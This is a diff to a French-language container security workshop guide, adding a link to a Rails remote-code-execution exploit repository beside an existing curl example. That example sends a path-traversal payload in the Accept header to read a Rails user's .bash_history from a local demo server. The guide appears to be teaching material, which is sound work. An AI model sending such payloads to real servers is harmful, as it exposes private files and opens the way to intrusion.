@@ -34,6 +34,8 @@ curl localhost:3000/chybeta
 curl localhost:3000/chybeta -H "Accept: ../../../../../../../../../../rails/.bash_history{{"
 ```
 
+On peut aller plus loin... https://github.com/mpgn/Rails-doubletap-RCE
+
 Cheatsheet : https://res.cloudinary.com/snyk/image/upload/v1551798390/Docker_Image_Security_Best_Practices_.pdf
 
 ### 02 : Cloisonner les composants d’un cluster
